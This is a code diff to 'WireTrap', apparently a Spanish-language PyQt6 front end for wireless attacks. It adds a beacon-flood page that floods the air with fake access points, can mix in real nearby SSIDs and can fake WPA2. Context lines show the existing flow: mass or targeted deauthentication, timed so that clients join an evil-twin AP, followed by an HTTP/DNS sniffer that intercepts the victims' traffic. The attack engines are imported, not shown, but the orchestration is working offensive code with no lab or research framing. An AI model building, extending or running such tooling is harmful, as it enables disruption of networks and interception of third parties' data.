@@ -9,7 +9,7 @@ from PyQt6.QtWidgets import (
     QHBoxLayout, QTableWidget, QTableWidgetItem, QPushButton,
     QLabel, QComboBox, QHeaderView, QFrame, QSplitter,
     QTextEdit, QGroupBox, QMessageBox, QLineEdit,
-    QStackedWidget, QCheckBox
+    QStackedWidget, QCheckBox, QSlider
 )
 from PyQt6.QtCore import Qt, QTimer, pyqtSignal, QObject
 from PyQt6.QtGui import QColor, QFont
@@ -17,6 +17,7 @@ from PyQt6.QtGui import QColor, QFont
 from core.scanner import Scanner, AccessPoint, Client
 from core.deauth import Deauther
 from core.evil_twin import EvilTwin
+from core.beacon_flood import BeaconFlooder
 from core.wpa2_crypto import WPA2Crypto
 from core.decision_engine import DecisionEngine, AttackTechnique
 from gui.dashboard_dialog import DashboardDialog
@@ -35,6 +36,8 @@ class SignalBridge(QObject):
     pmkid_success    = pyqtSignal(str)
     pmkid_error      = pyqtSignal(str)
     wpa2_log_message = pyqtSignal(str)
+    flood_beacon_sent = pyqtSignal(int)
+    flood_stopped    = pyqtSignal()
 
 
 # ── Ventana principal ─────────────────────────────────────────
@@ -59,8 +62,9 @@ class WireTrap(QMainWindow):
         self.evil_twin = None
         self.sniffer  = None
         self.wpa2_engine = None
+        self.flooder  = None
         self.engine   = DecisionEngine()
-        
+
         self.dashboards = []
 
         # Bridge de señales
@@ -75,10 +79,10 @@ class WireTrap(QMainWindow):
         self.bridge.pmkid_success.connect(self._on_pmkid_success)
         self.bridge.pmkid_error.connect(self._on_pmkid_error)
         self.bridge.wpa2_log_message.connect(self.log_wpa2)
+        self.bridge.flood_beacon_sent.connect(self._on_flood_beacon_sent)
+        self.bridge.flood_stopped.connect(self._on_flood_stopped)
 
         # Timer para refrescar señal y contadores de la tabla de APs
-        # cada 2 s (el scanner actualiza los objetos internos pero no
-        # dispara señales en actualizaciones; esto cierra esa brecha).
         self._refresh_timer = QTimer(self)
         self._refresh_timer.setInterval(2000)
         self._refresh_timer.timeout.connect(self._refresh_ap_table)
@@ -110,6 +114,10 @@ class WireTrap(QMainWindow):
         self._setup_wpa2_ui(self.page_wpa2)
         self.stack.addWidget(self.page_wpa2)
 
+        self.page_flood = QWidget()
+        self._setup_flood_ui(self.page_flood)
+        self.stack.addWidget(self.page_flood)
+
         self.stack.setCurrentIndex(0)
 
     def _setup_launcher_ui(self, parent_widget):
@@ -121,7 +129,7 @@ class WireTrap(QMainWindow):
         title.setAlignment(Qt.AlignmentFlag.AlignCenter)
         title.setStyleSheet("color: #ff3333; margin-bottom: 30px;")
         layout.addWidget(title)
-        
+
         subtitle = QLabel("Selecciona un Módulo de Ataque")
         subtitle.setFont(QFont("Monospace", 14))
         subtitle.setAlignment(Qt.AlignmentFlag.AlignCenter)
@@ -145,6 +153,13 @@ class WireTrap(QMainWindow):
         btn_pmkid.setStyleSheet("background-color: #113311; border: 2px solid #00aa44; color: white;")
         btn_pmkid.clicked.connect(lambda: self.stack.setCurrentIndex(2))
 
+        btn_flood = QPushButton("📡 Beacon Flood (Saturación de APs)")
+        btn_flood.setFixedHeight(60)
+        btn_flood.setFixedWidth(400)
+        btn_flood.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
+        btn_flood.setStyleSheet("background-color: #111133; border: 2px solid #5588ff; color: white;")
+        btn_flood.clicked.connect(lambda: self.stack.setCurrentIndex(3))
+
         btn_captive = QPushButton("🎣 Portal Cautivo [Próximamente]")
         btn_captive.setFixedHeight(60)
         btn_captive.setFixedWidth(400)
@@ -159,10 +174,326 @@ class WireTrap(QMainWindow):
 
         grid.addWidget(btn_deauth_et, alignment=Qt.AlignmentFlag.AlignCenter)
         grid.addWidget(btn_pmkid, alignment=Qt.AlignmentFlag.AlignCenter)
+        grid.addWidget(btn_flood, alignment=Qt.AlignmentFlag.AlignCenter)
         grid.addWidget(btn_captive, alignment=Qt.AlignmentFlag.AlignCenter)
         grid.addWidget(btn_dns, alignment=Qt.AlignmentFlag.AlignCenter)
 
         layout.addLayout(grid)
+
+    def _setup_flood_ui(self, parent_widget):
+        layout = QVBoxLayout(parent_widget)
+        layout.setSpacing(8)
+        layout.setContentsMargins(10, 10, 10, 10)
+
+        # Header
+        header = QHBoxLayout()
+        btn_back = QPushButton("⬅ Volver al Menú")
+        btn_back.setFixedWidth(150)
+        btn_back.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
+        btn_back.clicked.connect(lambda: self.stack.setCurrentIndex(0))
+        header.addWidget(btn_back)
+        header.addSpacing(20)
+
+        title = QLabel("📡 WireTrap: Beacon Flood — Saturación de APs")
+        title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
+        title.setStyleSheet("color: #5588ff;")
+        header.addWidget(title)
+        header.addStretch()
+
+        self.flood_iface_label = QLabel("Interfaz Monitor:")
+        self.flood_iface_combo = QComboBox()
+        self.flood_iface_combo.setFixedWidth(140)
+        header.addWidget(self.flood_iface_label)
+        header.addWidget(self.flood_iface_combo)
+        header.addSpacing(16)
+
+        self.flood_status_label = QLabel("● IDLE")
+        self.flood_status_label.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
+        self.flood_status_label.setStyleSheet("color: gray; font-weight: bold;")
+        header.addWidget(self.flood_status_label)
+
+        layout.addLayout(header)
+
+        line = QFrame()
+        line.setFrameShape(QFrame.Shape.HLine)
+        line.setStyleSheet("color: #444;")
+        layout.addWidget(line)
+
+        # Panel central: opciones + log + stats
+        center = QHBoxLayout()
+
+        # ── Opciones ──────────────────────────────────────────
+        opts_group = QGroupBox("CONFIGURACIÓN")
+        opts_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
+        opts_group.setFixedWidth(340)
+        opts_layout = QVBoxLayout(opts_group)
+        opts_layout.setSpacing(18)
+
+        # Canal
+        ch_row = QHBoxLayout()
+        ch_label = QLabel("Canal fijo:")
+        ch_label.setFont(QFont("Monospace", 10))
+        self.flood_channel_combo = QComboBox()
+        self.flood_channel_combo.addItems([str(i) for i in range(1, 15)])
+        self.flood_channel_combo.setCurrentText("6")
+        self.flood_channel_combo.setFixedWidth(70)
+        ch_row.addWidget(ch_label)
+        ch_row.addStretch()
+        ch_row.addWidget(self.flood_channel_combo)
+        opts_layout.addLayout(ch_row)
+
+        # Rotar canales
+        self.flood_chk_rotate = QCheckBox(" Rotar canales (1 / 6 / 11)")
+        self.flood_chk_rotate.setFont(QFont("Monospace", 10))
+        self.flood_chk_rotate.setStyleSheet("color: #5588ff;")
+        self.flood_chk_rotate.stateChanged.connect(
+            lambda s: self.flood_channel_combo.setEnabled(s != 2)
+        )
+        opts_layout.addWidget(self.flood_chk_rotate)
+
+        # Velocidad
+        spd_label = QLabel("Velocidad (beacons/s):")
+        spd_label.setFont(QFont("Monospace", 10))
+        opts_layout.addWidget(spd_label)
+
+        self.flood_speed_slider = QSlider(Qt.Orientation.Horizontal)
+        self.flood_speed_slider.setMinimum(1)
+        self.flood_speed_slider.setMaximum(5)
+        self.flood_speed_slider.setValue(3)
+        self.flood_speed_slider.setTickPosition(QSlider.TickPosition.TicksBelow)
+        self.flood_speed_slider.setTickInterval(1)
+        opts_layout.addWidget(self.flood_speed_slider)
+
+        self.flood_speed_value = QLabel("~500/s  (velocidad media)")
+        self.flood_speed_value.setFont(QFont("Monospace", 9))
+        self.flood_speed_value.setStyleSheet("color: #aaaaaa;")
+        opts_layout.addWidget(self.flood_speed_value)
+
+        speed_map = {
+            1: (0.010, "~100/s  (lento)"),
+            2: (0.005, "~200/s  (bajo)"),
+            3: (0.002, "~500/s  (medio)"),
+            4: (0.001, "~1000/s (rápido)"),
+            5: (0.0,   "máximo  (sin límite)"),
+        }
+        self.flood_speed_slider.valueChanged.connect(
+            lambda v: self.flood_speed_value.setText(speed_map[v][1])
+        )
+
+        sep = QFrame()
+        sep.setFrameShape(QFrame.Shape.HLine)
+        sep.setStyleSheet("color: #333;")
+        opts_layout.addWidget(sep)
+
+        # Mezclar SSIDs reales
+        self.flood_chk_real = QCheckBox(" Mezclar SSIDs reales\n (escanear primero)")
+        self.flood_chk_real.setFont(QFont("Monospace", 10))
+        self.flood_chk_real.setStyleSheet("color: #00ff88;")
+        opts_layout.addWidget(self.flood_chk_real)
+
+        # Botón escanear para capturar SSIDs reales
+        self.btn_flood_scan = QPushButton("🔍 Escanear SSIDs del entorno")
+        self.btn_flood_scan.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
+        self.btn_flood_scan.setStyleSheet(
+            "QPushButton { background: #1a2a4a; border: 1px solid #5588ff; color: #5588ff; padding: 6px; border-radius: 4px; }"
+            "QPushButton:hover { background: #5588ff; color: white; }"
+        )
+        self.btn_flood_scan.clicked.connect(self._on_flood_scan_clicked)
+        opts_layout.addWidget(self.btn_flood_scan)
+
+        self.flood_real_ssids_label = QLabel("SSIDs capturados: 0")
+        self.flood_real_ssids_label.setFont(QFont("Monospace", 9))
+        self.flood_real_ssids_label.setStyleSheet("color: #aaaaaa;")
+        opts_layout.addWidget(self.flood_real_ssids_label)
+
+        opts_layout.addStretch()
+
+        # Anunciar WPA2
+        self.flood_chk_wpa2 = QCheckBox(" Anunciar como WPA2\n (aparece con 🔒)")
+        self.flood_chk_wpa2.setFont(QFont("Monospace", 10))
+        self.flood_chk_wpa2.setChecked(True)
+        self.flood_chk_wpa2.setStyleSheet("color: #ffaa00;")
+        opts_layout.addWidget(self.flood_chk_wpa2)
+
+        center.addWidget(opts_group)
+
+        # ── Panel derecho: stats + log ─────────────────────────
+        right_layout = QVBoxLayout()
+
+        # Stats
+        stats_group = QGroupBox("ESTADÍSTICAS EN VIVO")
+        stats_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
+        stats_layout = QHBoxLayout(stats_group)
+        stats_layout.setSpacing(40)
+
+        self.flood_lbl_count = QLabel("0")
+        self.flood_lbl_count.setFont(QFont("Monospace", 36, QFont.Weight.Bold))
+        self.flood_lbl_count.setStyleSheet("color: #5588ff;")
+        self.flood_lbl_count.setAlignment(Qt.AlignmentFlag.AlignCenter)
+
+        count_desc = QLabel("beacons\nenviados")
+        count_desc.setFont(QFont("Monospace", 11))
+        count_desc.setStyleSheet("color: #aaaaaa;")
+
+        self.flood_lbl_ssids = QLabel("0")
+        self.flood_lbl_ssids.setFont(QFont("Monospace", 36, QFont.Weight.Bold))
+        self.flood_lbl_ssids.setStyleSheet("color: #00ff88;")
+        self.flood_lbl_ssids.setAlignment(Qt.AlignmentFlag.AlignCenter)
+
+        ssids_desc = QLabel("SSIDs\nreales mezclados")
+        ssids_desc.setFont(QFont("Monospace", 11))
+        ssids_desc.setStyleSheet("color: #aaaaaa;")
+
+        stats_layout.addStretch()
+        stats_layout.addWidget(self.flood_lbl_count)
+        stats_layout.addWidget(count_desc)
+        stats_layout.addSpacing(60)
+        stats_layout.addWidget(self.flood_lbl_ssids)
+        stats_layout.addWidget(ssids_desc)
+        stats_layout.addStretch()
+
+        stats_group.setFixedHeight(130)
+        right_layout.addWidget(stats_group)
+
+        # Log
+        log_group = QGroupBox("LOG")
+        log_group.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
+        log_layout_inner = QVBoxLayout(log_group)
+        self.flood_log = QTextEdit()
+        self.flood_log.setReadOnly(True)
+        self.flood_log.setFont(QFont("Monospace", 9))
+        self.flood_log.setStyleSheet("background: #0d0d1a; color: #5588ff; border: 1px solid #333;")
+        self.flood_log.setPlaceholderText("Los eventos aparecerán aquí...")
+        log_layout_inner.addWidget(self.flood_log)
+        right_layout.addWidget(log_group)
+
+        center.addLayout(right_layout)
+        layout.addLayout(center, 1)
+
+        # Botones
+        btn_row = QHBoxLayout()
+        self.btn_flood_start = QPushButton("📡  Iniciar Beacon Flood")
+        self.btn_flood_start.setFixedHeight(44)
+        self.btn_flood_start.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
+        self.btn_flood_start.setStyleSheet(
+            "QPushButton { background: #111133; border: 2px solid #5588ff; color: #5588ff; border-radius: 4px; }"
+            "QPushButton:hover { background: #5588ff; color: white; }"
+        )
+        self.btn_flood_start.clicked.connect(self._on_flood_start_clicked)
+
+        self.btn_flood_stop = QPushButton("■  Detener")
+        self.btn_flood_stop.setFixedHeight(44)
+        self.btn_flood_stop.setFont(QFont("Monospace", 11, QFont.Weight.Bold))
+        self.btn_flood_stop.setEnabled(False)
+        self.btn_flood_stop.clicked.connect(self._on_flood_stop_clicked)
+
+        btn_row.addWidget(self.btn_flood_start)
+        btn_row.addWidget(self.btn_flood_stop)
+        layout.addLayout(btn_row)
+
+    # ── Flood: callbacks y slots ──────────────────────────────
+
+    def _flood_log(self, msg):
+        from datetime import datetime
+        ts = datetime.now().strftime("%H:%M:%S")
+        self.flood_log.append(f"[{ts}] {msg}")
+
+    def _on_flood_scan_clicked(self):
+        """Escaneo rápido de 8 s para capturar SSIDs reales del entorno."""
+        iface = self.flood_iface_combo.currentText()
+        if not iface:
+            QMessageBox.warning(self, "Error", "Selecciona una interfaz.")
+            return
+
+        self.btn_flood_scan.setEnabled(False)
+        self.btn_flood_scan.setText("🔍 Escaneando... (8s)")
+        self._flood_log(f"Escaneando SSIDs reales en {iface}...")
+        self._flood_captured_ssids = []
+
+        flood_scanner = Scanner(iface)
+
+        def on_ap(ap):
+            if ap.ssid and ap.ssid not in self._flood_captured_ssids:
+                self._flood_captured_ssids.append(ap.ssid)
+                self.flood_real_ssids_label.setText(
+                    f"SSIDs capturados: {len(self._flood_captured_ssids)}"
+                )
+                self.flood_lbl_ssids.setText(str(len(self._flood_captured_ssids)))
+
+        flood_scanner.on_ap_found = on_ap
+        flood_scanner.start()
+
+        def stop_scan():
+            flood_scanner.stop()
+            self._flood_log(
+                f"Escaneo completado: {len(self._flood_captured_ssids)} SSIDs capturados"
+            )
+            self.btn_flood_scan.setEnabled(True)
+            self.btn_flood_scan.setText("🔍 Escanear SSIDs del entorno")
+
+        QTimer.singleShot(8000, stop_scan)
+
+    def _on_flood_start_clicked(self):
+        iface = self.flood_iface_combo.currentText()
+        if not iface:
+            QMessageBox.warning(self, "Error", "Selecciona una interfaz monitor.")
+            return
+
+        speed_map = {
+            1: 0.010,
+            2: 0.005,
+            3: 0.002,
+            4: 0.001,
+            5: 0.0,
+        }
+        interval = speed_map[self.flood_speed_slider.value()]
+        channel = int(self.flood_channel_combo.currentText())
+        rotate = self.flood_chk_rotate.isChecked()
+        mix_real = self.flood_chk_real.isChecked()
+        real_ssids = getattr(self, "_flood_captured_ssids", [])
+
+        if mix_real and not real_ssids:
+            self._flood_log("[!] No hay SSIDs capturados — escanea primero o desmarca la opción.")
+
+        self.flooder = BeaconFlooder(iface)
+        self.flooder.announce_wpa2 = self.flood_chk_wpa2.isChecked()
+        self.flooder.on_beacon_sent = lambda c: self.bridge.flood_beacon_sent.emit(c)
+        self.flooder.on_stopped = lambda: self.bridge.flood_stopped.emit()
+
+        self.flooder.start(
+            channel=channel,
+            interval=interval,
+            rotate_channels=rotate,
+            mix_real_ssids=mix_real,
+            real_ssids=real_ssids
+        )
+
+        self._flood_log(f"Beacon Flood iniciado en {iface}")
+        self._flood_log(f"  Canal: {'rotando 1/6/11' if rotate else channel}")
+        self._flood_log(f"  Velocidad: {self.flood_speed_value.text().strip()}")
+        self._flood_log(f"  SSIDs reales mezclados: {'sí (' + str(len(real_ssids)) + ')' if mix_real else 'no'}")
+        self._flood_log(f"  WPA2 falso: {'sí' if self.flooder.announce_wpa2 else 'no'}")
+
+        self.flood_status_label.setText("● FLOODING")
+        self.flood_status_label.setStyleSheet("color: #5588ff; font-weight: bold;")
+        self.btn_flood_start.setEnabled(False)
+        self.btn_flood_stop.setEnabled(True)
+        self.btn_flood_scan.setEnabled(False)
+
+    def _on_flood_stop_clicked(self):
+        if self.flooder:
+            self.flooder.stop()
+
+    def _on_flood_beacon_sent(self, count):
+        self.flood_lbl_count.setText(f"{count:,}".replace(",", "."))
+
+    def _on_flood_stopped(self):
+        self._flood_log("Beacon Flood detenido.")
+        self.flood_status_label.setText("● IDLE")
+        self.flood_status_label.setStyleSheet("color: gray; font-weight: bold;")
+        self.btn_flood_start.setEnabled(True)
+        self.btn_flood_stop.setEnabled(False)
+        self.btn_flood_scan.setEnabled(True)
 
     def _setup_deauth_ui(self, parent_widget):
         main_layout = QVBoxLayout(parent_widget)
@@ -171,7 +502,7 @@ class WireTrap(QMainWindow):
 
         # Header (barra compacta, no debe competir con las tablas)
         header = QHBoxLayout()
-        
+
         self.btn_back = QPushButton("⬅ Volver al Menú")
         self.btn_back.setFixedWidth(150)
         self.btn_back.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
@@ -305,7 +636,7 @@ class WireTrap(QMainWindow):
         self.et_table.setAlternatingRowColors(True)
         self.et_table.cellDoubleClicked.connect(self._on_et_table_double_click)
         et_layout.addWidget(self.et_table)
-        
+
         self.btn_global_dashboard = QPushButton("▶ Dashboard Global de Interceptación")
         self.btn_global_dashboard.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
         self.btn_global_dashboard.setStyleSheet(
@@ -319,8 +650,6 @@ class WireTrap(QMainWindow):
         splitter.addWidget(self.et_group)
 
         splitter.setSizes([700, 600, 700])
-        # Las tablas son el panel principal: se llevan casi todo el
-        # espacio vertical disponible frente al panel de ataque/log.
         main_layout.addWidget(splitter, 6)
 
         # ── Panel de ataque: secundario, compacto ────────────────
@@ -345,8 +674,7 @@ class WireTrap(QMainWindow):
             "QCheckBox::indicator:checked { background: #00ff88; border: 2px solid #00ff88; }"
         )
         self.chk_eviltwin.stateChanged.connect(self._on_et_checkbox_changed)
-        
-        # Propiedad nativa para guardar la pass temporal
+
         self.wpa_passphrase = ""
 
         pass_layout = QVBoxLayout()
@@ -390,7 +718,7 @@ class WireTrap(QMainWindow):
         main_layout.addLayout(btn_layout)
 
     def _on_et_checkbox_changed(self, state):
-        is_checked = (state == 2)  # Qt.CheckState.Checked = 2
+        is_checked = (state == 2)
         if is_checked:
             from PyQt6.QtWidgets import QDialog, QVBoxLayout, QLabel, QLineEdit, QPushButton, QHBoxLayout
             from PyQt6.QtCore import Qt
@@ -398,7 +726,7 @@ class WireTrap(QMainWindow):
 
             dialog = QDialog(self)
             dialog.setWindowTitle("Contraseña Evil Twin")
-            dialog.setFixedSize(450, 200)
+            dialog.setFixedSize(450, 220)
             dialog.setStyleSheet(
                 "QDialog { background: #0a1f0a; border: 2px solid #00aa44; border-radius: 8px; }"
                 "QLabel { color: #00ff88; font-weight: bold; font-family: Monospace; font-size: 11pt; }"
@@ -407,27 +735,40 @@ class WireTrap(QMainWindow):
                 "QPushButton:hover { background: #00ff88; }"
             )
             layout = QVBoxLayout(dialog)
-            
-            lbl = QLabel("Introduce la contraseña para el Evil Twin:\n(Déjalo vacío para crear una red Abierta/OPEN)")
+
+            lbl = QLabel("Introduce la contraseña para el Evil Twin:\n(Déjalo vacío para crear una red Abierta/OPEN)\n(WPA2 requiere mínimo 8 caracteres)")
             lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
             layout.addWidget(lbl)
             layout.addSpacing(10)
-            
+
             inp = QLineEdit()
             inp.setPlaceholderText("Ej: contrasena123")
             layout.addWidget(inp)
             layout.addSpacing(15)
-            
+
+            warn_lbl = QLabel("")
+            warn_lbl.setStyleSheet("color: #ff4444; font-size: 9pt;")
+            warn_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
+            layout.addWidget(warn_lbl)
+
             btn_layout = QHBoxLayout()
             btn_ok = QPushButton("Aceptar")
             btn_cancel = QPushButton("Cancelar")
             btn_cancel.setStyleSheet("background: #555555; color: white;")
             btn_cancel.clicked.connect(dialog.reject)
-            btn_ok.clicked.connect(dialog.accept)
+
+            def on_accept():
+                pwd = inp.text().strip()
+                if pwd and len(pwd) < 8:
+                    warn_lbl.setText("⚠ WPA2 exige mínimo 8 caracteres")
+                    return
+                dialog.accept()
+
+            btn_ok.clicked.connect(on_accept)
             btn_layout.addWidget(btn_cancel)
             btn_layout.addWidget(btn_ok)
             layout.addLayout(btn_layout)
-            
+
             if dialog.exec():
                 self.wpa_passphrase = inp.text().strip()
                 self.et_group.setVisible(True)
@@ -509,12 +850,27 @@ class WireTrap(QMainWindow):
             QLabel {
                 color: #e0e0e0;
             }
+            QSlider::groove:horizontal {
+                height: 6px;
+                background: #333;
+                border-radius: 3px;
+            }
+            QSlider::handle:horizontal {
+                background: #5588ff;
+                width: 16px;
+                height: 16px;
+                margin: -5px 0;
+                border-radius: 8px;
+            }
+            QSlider::sub-page:horizontal {
+                background: #5588ff;
+                border-radius: 3px;
+            }
         """)
 
     # ── Interfaces ────────────────────────────────────────────
 
     def _populate_interfaces(self):
-        """Detecta interfaces de red disponibles"""
         import subprocess
         result = subprocess.run(
             ["ip", "link", "show"],
@@ -530,13 +886,14 @@ class WireTrap(QMainWindow):
         self.iface_combo.addItems(interfaces)
         self.iface2_combo.addItems(interfaces)
         self.out_combo.addItems(interfaces)
+        self.flood_iface_combo.addItems(interfaces)
         if hasattr(self, 'wpa2_iface_combo'):
             self.wpa2_iface_combo.addItems(interfaces)
 
-        # Preseleccionar interfaces comunes
         for i, iface in enumerate(interfaces):
             if "wlan0" in iface:
                 self.iface_combo.setCurrentIndex(i)
+                self.flood_iface_combo.setCurrentIndex(i)
                 if hasattr(self, 'wpa2_iface_combo'):
                     self.wpa2_iface_combo.setCurrentIndex(i)
             if "wlan1" in iface:
@@ -568,7 +925,6 @@ class WireTrap(QMainWindow):
             elif getattr(self.selected_ap, "pmf_capable", False):
                 self.log("⚠ PMF opcional (802.11w MFPC) en este AP: "
                           "el deauth puede fallar contra clientes modernos.")
-            # Fijar canal al del AP seleccionado
             if self.scanner and self.selected_ap.channel:
                 self.scanner.fixed_channel = self.selected_ap.channel
                 self.log(f"Canal fijado: {self.selected_ap.channel}")
@@ -585,14 +941,11 @@ class WireTrap(QMainWindow):
             self._update_attack_info()
 
     def _update_attack_info(self):
-        ap_str     = (self.selected_ap.ssid
-                      if self.selected_ap else "—")
+        ap_str     = (self.selected_ap.ssid if self.selected_ap else "—")
         client_str = (self.selected_client.mac
                       if self.selected_client else "Todos los clientes")
-        tech_str   = (self.attack_plan.technique
-                      if self.attack_plan else "—")
-        risk_str   = (self.attack_plan.risk_level
-                      if self.attack_plan else "—")
+        tech_str   = (self.attack_plan.technique if self.attack_plan else "—")
+        risk_str   = (self.attack_plan.risk_level if self.attack_plan else "—")
         estado     = "ATACANDO" if self.attacking else "IDLE"
 
         self.attack_info.setText(
@@ -603,26 +956,21 @@ class WireTrap(QMainWindow):
             f"Estado:           {estado}"
         )
 
-    # ── Callbacks del scanner (desde threads) ─────────────────
+    # ── Callbacks del scanner ─────────────────────────────────
 
     def _on_ap_found(self, ap: AccessPoint):
-        """Añade un AP a las tablas — ejecutado en el hilo de la GUI"""
         self._insert_ap_into_table(self.ap_table, ap)
         if hasattr(self, 'wpa2_ap_table'):
             self._insert_ap_into_table(self.wpa2_ap_table, ap)
-            
+
     def _insert_ap_into_table(self, table, ap: AccessPoint):
         if not table: return
         row = table.rowCount()
         table.insertRow(row)
 
         values = [
-            ap.ssid,
-            ap.bssid,
-            str(ap.channel),
-            ap.security,
-            f"{ap.signal} dBm",
-            str(len(ap.clients))
+            ap.ssid, ap.bssid, str(ap.channel),
+            ap.security, f"{ap.signal} dBm", str(len(ap.clients))
         ]
 
         for col, val in enumerate(values):
@@ -631,25 +979,18 @@ class WireTrap(QMainWindow):
 
             if col == 3:
                 colors = {
-                    "OPEN":     "#ff4444",
-                    "WEP":      "#ff6600",
-                    "WPA":      "#ffaa00",
-                    "WPA2":     "#ffcc00",
-                    "WPA2/WPA3":"#88ff00",
-                    "WPA3":     "#00ff88",
+                    "OPEN": "#ff4444", "WEP": "#ff6600",
+                    "WPA": "#ffaa00", "WPA2": "#ffcc00",
+                    "WPA2/WPA3": "#88ff00", "WPA3": "#00ff88",
                 }
-                color = colors.get(val, "#e0e0e0")
-                item.setForeground(QColor(color))
+                item.setForeground(QColor(colors.get(val, "#e0e0e0")))
 
             table.setItem(row, col, item)
 
     def _on_client_found(self, client: Client):
-        """Añade un cliente a la tabla si pertenece al AP seleccionado"""
-        if (self.selected_ap and
-                client.bssid == self.selected_ap.bssid):
+        if self.selected_ap and client.bssid == self.selected_ap.bssid:
             self._add_client_row(client)
 
-        # Actualizar contador de clientes en la tabla de APs
         def _update_count(table):
             if not getattr(self, table, None): return
             t = getattr(self, table)
@@ -662,26 +1003,20 @@ class WireTrap(QMainWindow):
                         count_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
                         t.setItem(row, 5, count_item)
                     break
-                    
+
         _update_count('ap_table')
         _update_count('wpa2_ap_table')
 
     def _add_client_row(self, client: Client):
         row = self.client_table.rowCount()
         self.client_table.insertRow(row)
-        values = [
-            client.mac,
-            client.vendor,
-            f"{client.signal} dBm",
-            client.bssid
-        ]
+        values = [client.mac, client.vendor, f"{client.signal} dBm", client.bssid]
         for col, val in enumerate(values):
             item = QTableWidgetItem(val)
             item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
             self.client_table.setItem(row, col, item)
 
     def _refresh_ap_table(self):
-        """Refresca señal y contadores en la tabla de APs cada 2 s."""
         if not self.scanner:
             return
 
@@ -750,7 +1085,6 @@ class WireTrap(QMainWindow):
 
     def _on_data_captured(self, data):
         self.log(f"[!] Tráfico interceptado: {data.data_type} ({data.source_ip})")
-        # Cleanup closed dashboards
         self.dashboards = [d for d in self.dashboards if d.isVisible()]
         for dash in self.dashboards:
             dash.on_data_captured(data)
@@ -760,14 +1094,12 @@ class WireTrap(QMainWindow):
         self._update_attack_info()
         self.log("[!] Ataque detenido.")
         self.status_label.setText("● IDLE")
-        self.status_label.setStyleSheet(
-            "color: gray; font-weight: bold;"
-        )
+        self.status_label.setStyleSheet("color: gray; font-weight: bold;")
         self.et_group.setStyleSheet("")
         self.btn_stop.setEnabled(False)
         self.btn_attack.setEnabled(True)
 
-    # ── Botones ───────────────────────────────────────────────
+    # ── Botones Deauth ────────────────────────────────────────
 
     def _on_scan_clicked(self):
         iface = self.iface_combo.currentText()
@@ -782,26 +1114,18 @@ class WireTrap(QMainWindow):
         self.attack_plan     = None
 
         self.scanner = Scanner(iface)
-        self.scanner.on_ap_found     = (
-            lambda ap: self.bridge.ap_found.emit(ap)
-        )
-        self.scanner.on_client_found = (
-            lambda c: self.bridge.client_found.emit(c)
-        )
+        self.scanner.on_ap_found     = lambda ap: self.bridge.ap_found.emit(ap)
+        self.scanner.on_client_found = lambda c: self.bridge.client_found.emit(c)
 
         self.scanner.start()
         self._refresh_timer.start()
         self.status_label.setText("● ESCANEANDO")
-        self.status_label.setStyleSheet(
-            "color: #00ff88; font-weight: bold;"
-        )
+        self.status_label.setStyleSheet("color: #00ff88; font-weight: bold;")
         self.log(f"Escaneo iniciado en {iface}...")
 
     def _on_attack_clicked(self):
         if not self.selected_ap:
-            QMessageBox.warning(
-                self, "Error", "Selecciona un AP primero."
-            )
+            QMessageBox.warning(self, "Error", "Selecciona un AP primero.")
             return
 
         if not self.attack_plan:
@@ -811,13 +1135,9 @@ class WireTrap(QMainWindow):
         iface_ap  = self.iface2_combo.currentText()
         iface_out = self.out_combo.currentText()
 
-        # Detener escaneo antes del ataque
         if self.scanner:
             self.scanner.stop()
 
-        # Fijar explícitamente el canal de la interfaz monitora al del AP
-        # objetivo. El scanner lo fijaba mientras estaba vivo, pero al
-        # pararlo la interfaz puede quedarse en cualquier canal del hopper.
         if self.selected_ap.channel:
             import subprocess
             subprocess.run(
@@ -825,27 +1145,20 @@ class WireTrap(QMainWindow):
                  str(self.selected_ap.channel)],
                 capture_output=True
             )
-            self.log(f"Canal fijado en interfaz monitora: "
-                     f"{self.selected_ap.channel}")
+            self.log(f"Canal fijado en interfaz monitora: {self.selected_ap.channel}")
 
         self.log(f"Iniciando ataque: {self.attack_plan.technique}")
         self.log(f"Razón: {self.attack_plan.reason}")
 
-        # Determinar cliente objetivo
         client_mac = (self.selected_client.mac
                       if self.selected_client
                       else "ff:ff:ff:ff:ff:ff")
 
-        # Iniciar deauth
         self.deauther = Deauther(iface_mon)
         self.deauther.on_packet_sent = (
-            lambda c: self.bridge.log_message.emit(
-                f"Deauth enviados: {c} paquetes"
-            )
+            lambda c: self.bridge.log_message.emit(f"Deauth enviados: {c} paquetes")
         )
-        # El deauth se arranca después del Evil Twin para elegir el modo correcto
 
-        # Iniciar evil twin (solo si la casilla está marcada)
         if self.chk_eviltwin.isChecked():
             self.evil_twin = EvilTwin(iface_ap)
             self.evil_twin.on_started = (
@@ -882,9 +1195,6 @@ class WireTrap(QMainWindow):
             )
 
             if self.evil_twin.running:
-                # Modo ET: ráfaga de deauths → ventana de silencio → repite.
-                # El silencio da tiempo al cliente para completar el 4-way
-                # handshake con el Evil Twin sin ser expulsado de nuevo.
                 self.deauther.on_et_window = (
                     lambda: self.bridge.log_message.emit(
                         "[ET] Ventana libre — esperando asociación al AP falso..."
@@ -895,17 +1205,15 @@ class WireTrap(QMainWindow):
                          f"para evadir protecciones PMF/WPA3)")
 
                 actual_ap_iface = getattr(self.evil_twin, "ap_iface", iface_ap)
-                
-                # Pequeño delay adicional para que dhcp/ap estén asentados para el sniffer
+
                 import time
                 time.sleep(1.0)
-                
+
                 self.sniffer = WireTrapSniffer(actual_ap_iface)
                 self.sniffer.on_data = lambda d: self.bridge.data_captured.emit(d)
                 self.sniffer.start()
                 self.log(f"Módulo de Interceptación HTTP/DNS activo en {actual_ap_iface}")
             else:
-                # ET falló — deauth normal de todas formas
                 self.deauther.start(client_mac, self.selected_ap.bssid)
                 self.log("[!] Abortando inicio del sniffer porque falló AP falso.")
 
@@ -915,15 +1223,13 @@ class WireTrap(QMainWindow):
                 "border-radius: 4px; margin-top: 8px; padding-top: 10px; }"
